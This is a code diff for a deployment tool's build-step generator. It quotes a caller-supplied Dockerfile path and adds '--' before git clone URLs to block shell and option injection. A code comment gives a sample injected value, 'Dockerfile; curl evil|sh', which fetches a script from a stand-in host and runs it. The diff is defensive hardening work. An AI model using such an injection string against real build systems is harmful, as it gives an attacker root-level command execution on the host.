@@ -481,14 +481,17 @@ function prepSteps(app: AppSpec, version: string, noCache = false): string[] {
         'chmod 600 "$sd/token"',
         `printf '%s\\n' '#!/bin/sh' 'cat "$(dirname "$0")/token"' > "$sd/askpass"`,
         'chmod 700 "$sd/askpass"',
-        `GIT_ASKPASS="$sd/askpass" GIT_TERMINAL_PROMPT=0 git clone --depth 1 --branch ${shq(branch)} ${shq(gitAuthUrl(url))} ${bd}`,
+        `GIT_ASKPASS="$sd/askpass" GIT_TERMINAL_PROMPT=0 git clone --depth 1 --branch ${shq(branch)} -- ${shq(gitAuthUrl(url))} ${bd}`,
       );
     } else {
-      steps.push(`git clone --depth 1 --branch ${shq(branch)} ${shq(url)} ${bd}`);
+      steps.push(`git clone --depth 1 --branch ${shq(branch)} -- ${shq(url)} ${bd}`);
     }
     if (app.buildType === "DOCKERFILE") {
+      // shq the -f path: dockerfilePath is caller/importer-supplied; unquoted it was a host-root shell
+      // injection (e.g. `Dockerfile; curl evil|sh`). The `--` before each clone URL likewise stops a
+      // URL that begins with `-` from being parsed as a git option.
       const df = app.dockerfilePath || "Dockerfile";
-      steps.push(`docker build ${nc}${buildArgFlags}-t ${tag} -f ${bd}/${df} ${bd}`);
+      steps.push(`docker build ${nc}${buildArgFlags}-t ${tag} -f ${shq(`${bd}/${df}`)} ${bd}`);
     } else if (app.buildType === "STATIC") {
       // Generate an nginx (+ optional node build stage) Dockerfile and config.
       steps.push(
